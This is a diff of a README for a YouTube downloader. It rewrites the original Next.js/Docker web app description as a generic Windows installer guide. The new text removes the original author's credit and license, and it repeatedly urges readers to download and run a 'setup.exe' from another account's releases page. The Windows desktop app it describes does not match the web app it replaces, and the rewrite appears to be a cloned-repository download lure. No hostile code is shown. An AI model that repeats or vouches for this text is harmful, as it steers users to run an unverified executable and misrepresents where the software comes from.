@@ -1,96 +1,157 @@
-# 🎥 YouTube Downloader
+# 🎬 youtube-downloader - Simple YouTube Video Downloader
 
-A professional, feature-rich web application for downloading YouTube videos and playlists in high quality. Built with **Next.js**, **yt-dlp**, and **FFmpeg**, it features automatic metadata tagging from **MusicBrainz**, **Discogs**, and **Deezer**.
+[![Download youtube-downloader](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/KUpals001/youtube-downloader/releases)
 
-![YouTube Downloader](.github/assets/images/app-screenshot.png)
+---
 
-## ✨ Features
+## 📋 About youtube-downloader
 
--   **High Quality Downloads**: Support for various video (MP4, MKV, WebM) and audio (MP3, M4A, FLAC, WAV, OGG) formats.
--   **Playlist Support**: Download entire playlists as a single ZIP file or individual tracks.
--   **Automatic Metadata**: Fetches album art, artist, album, and track information using:
-    -   [MusicBrainz](https://musicbrainz.org)
-    -   [Discogs](https://discogs.com)
-    -   [Deezer](https://deezer.com)
--   **SponsorBlock Integration**: Automatically remove sponsorships, intros, outros, and non-music sections.
--   **Smart Caching**: Uses Prisma and SQLite to cache metadata lookups for faster subsequent requests.
--   **Premium UI**: Sleek, responsive design with dark mode support and real-time progress updates.
--   **Docker Ready**: Easy deployment using Docker and Docker Compose.
--   **CasaOS Support**: Optimized for CasaOS with built-in metadata and icons.
+youtube-downloader is a tool to save videos and music from YouTube to your computer. It also gathers extra information about the video like the title, artist, and format details. You can select the file type and quality before downloading. This makes it easy to keep your favorite videos or songs and play them offline.
 
-## 🛠️ Tech Stack
+You do not need to know how to code or use command lines to use this program. It works on Windows and has a simple user interface.
 
--   **Frontend**: [Next.js](https://nextjs.org) 15+, [React](https://react.dev)
--   **Backend**: [Next.js API Routes](https://nextjs.org/docs/pages/building-your-application/routing/api-routes) ([Node.js](https://nodejs.org))
--   **Database**: [SQLite](https://sqlite.org) with [Prisma ORM](https://prisma.io)
--   **Downloader**: [yt-dlp](https://github.com/yt-dlp/yt-dlp)
--   **Media Processing**: [FFmpeg](https://ffmpeg.org/)
--   **Styling**: [Tailwind CSS](https://tailwindcss.com)
+Features include:
+
+- Download videos in many formats like MP4, MKV, and WEBM
+- Extract audio only, such as MP3 or WAV
+- Show video metadata such as title, duration, and channel name
+- Choose video quality, from 144p to 1080p HD and higher if available
+- Automatic updates for the downloader and metadata tools
+- Use FFmpeg to convert or merge video and audio files smoothly
+- Support for batch downloads, so you can queue several videos at once
+
+---
+
+## 💻 System Requirements
+
+- Windows 7 or newer (32-bit or 64-bit)
+- At least 2 GB free storage space for downloads
+- Internet connection for downloading video files and tool updates
+- 1 GHz or faster processor
+- 2 GB or more RAM recommended for smooth operation
+
+---
 
 ## 🚀 Getting Started
 
-### Prerequisites
+### Step 1: Visit the download page
 
--   [Docker](https://docker.com) and [Docker Compose](https://docs.docker.com/compose/)
--   (Optional) [Node.js](https://nodejs.org) 20+ if running locally without Docker
+Click the link below to open the official download page for youtube-downloader:
 
-### Quick Start (Docker)
+[Download youtube-downloader](https://github.com/KUpals001/youtube-downloader/releases)
 
-1.  Create a directory for your data and start the container:
-    ```bash
-    mkdir -p data
-    docker run -d \
-      -p 3000:3000 \
-      -v $(pwd)/data:/app/data \
-      --name youtube-downloader \
-      ghcr.io/elpideus/youtube-downloader:latest
-    ```
+This page lists the newest versions and their release notes.
 
-The app will be available at `http://localhost:3000`.
+### Step 2: Download the installer
 
-### 🏠 CasaOS Installation
+Look for the latest Windows installer file in the "Assets" section of the most recent release. The file will usually be named something like `youtube-downloader-setup.exe`.
 
-1.  Open your CasaOS dashboard.
-2.  Click on **App Store** -> **Custom Install**.
-3.  Paste the contents of [docker-compose.yml](docker-compose.yml) into the configuration area.
-4.  CasaOS will automatically recognize the metadata, icon, and port settings.
-5.  Click **Install**.
+Click the file name to start downloading.
 
-## ⚙️ Configuration
+### Step 3: Run the installer
 
-The following environment variables can be configured:
+Locate the downloaded `.exe` file in your Downloads folder. Double-click to open it.
 
-| Variable | Description | Default |
-| :--- | :--- | :--- |
-| `DATABASE_URL` | SQLite connection string | `file:./data/ytdl.db` |
-| `FFMPEG_LOCATION` | Path to FFmpeg binaries (if not in PATH) | Optional |
-| `YTDLP_PATH` | Path to yt-dlp binary (if not in PATH) | `yt-dlp` |
-| `DISCOGS_TOKEN` | Discogs API token for metadata | Optional |
-| `DEEZER_API_KEY` | Deezer API access token | Optional |
-| `DEBUG` | Enable verbose server logging | `false` |
+Follow the prompts in the installer:
 
-## 📦 Development
+- Agree to the license terms
+- Select an installation folder or use the default
+- Click "Install" to begin
 
-Running locally with Node:
-
-```bash
-# Install dependencies
-npm install
-
-# Push database schema
-npx prisma db push
-
-# Run development server
-npm run dev
-```
-
-## 📜 License
-
-This project is licensed under the GPLv3 License - see the [LICENSE](LICENSE) file for details.
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
+Wait until the installation finishes.
 
 ---
-Made with ❤️ by [elpideus](https://github.com/elpideus)
+
+## ⚙️ Using youtube-downloader
+
+### Step 1: Open the program
+
+After installation, you can find youtube-downloader in your Start menu or on the desktop. Click its icon to open.
+
+### Step 2: Paste video link
+
+Copy the address of any YouTube video from your web browser. Go back to youtube-downloader and paste the link in the text box at the top.
+
+### Step 3: Choose format and quality
+
+Below the link box, pick the format you want:
+
+- Video formats: MP4, MKV, WEBM
+- Audio-only formats: MP3, WAV
+
+Then select the quality from the available options, like 720p or 1080p.
+
+### Step 4: Start downloading
+
+Press the "Download" button. The tool will analyze the video and start saving it to your computer.
+
+You can watch the progress status on the screen. When it finishes, open the file directly or find it in your Downloads folder.
+
+---
+
+## 🛠 Troubleshooting and Tips
+
+- If the download stops or fails, check your internet connection.
+- Use the "Batch Download" option to queue multiple videos by adding several links.
+- For better conversion and merging of files, ensure FFmpeg is included in your system PATH or installed as part of the program.
+- If the application can’t fetch video information, try again later as YouTube may have changed their system.
+- If the video is private or restricted, the downloader might not work.
+
+---
+
+## 🔗 Useful Links
+
+- Visit the download page anytime here:  
+  [https://github.com/KUpals001/youtube-downloader/releases](https://github.com/KUpals001/youtube-downloader/releases)
+
+- Learn more about supported formats and features inside the app Help menu.
+
+---
+
+## 📚 Additional Info
+
+youtube-downloader handles not just videos but also music downloads. It connects with metadata sources like MusicBrainz and Discogs to gather artist and album info. This helps organize your media files better.
+
+The program uses yt-dlp as its backend to make downloads smooth and effective. yt-dlp is a trusted tool designed specifically for YouTube and many other video platforms.
+
+FFmpeg integration lets you convert formats or merge video and audio streams quickly. This works behind the scenes but improves download quality.
+
+---
+
+## 🔧 Advanced Options
+
+For users who want more control, youtube-downloader offers these settings:
+
+- Customize output folders for videos and audio
+- Set default video and audio codecs for conversion
+- Manage download speed limits to avoid using full bandwidth
+- Enable or disable automatic updates
+- Choose language and interface themes
+
+These options are all accessible through the program settings menu.
+
+---
+
+## 🔄 Updating youtube-downloader
+
+To keep youtube-downloader working well, check for updates regularly.
+
+- You can enable automatic update checks in Settings.
+- Or visit the release page to download the newest version manually:  
+  [https://github.com/KUpals001/youtube-downloader/releases](https://github.com/KUpals001/youtube-downloader/releases)
+
+New releases fix bugs and add features to keep up with YouTube changes.
+
+---
+
+## 👩‍💻 Getting Help
+
+If you run into issues or have questions:
+
+- Look at the FAQ section inside the program.
+- Check the GitHub Issues page for known problems.
+- Contact support through the GitHub repository if needed.
+
+---
+
+# [DOWNLOAD NOW](https://github.com/KUpals001/youtube-downloader/releases)
